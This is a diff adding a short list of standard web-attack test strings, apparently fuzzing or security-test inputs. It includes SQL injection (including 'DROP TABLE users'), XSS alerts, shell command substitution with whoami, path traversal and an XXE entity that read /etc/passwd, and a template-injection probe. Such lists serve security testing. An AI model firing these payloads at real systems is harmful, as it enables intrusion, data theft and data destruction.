@@ -1,0 +1,10 @@
+' OR '1'='1:
+1; DROP TABLE users
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+$(whoami)
+|whoami
+../../etc/passwd
+..%2F..%2Fetc%2Fpasswd
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>
+{{7*7}}
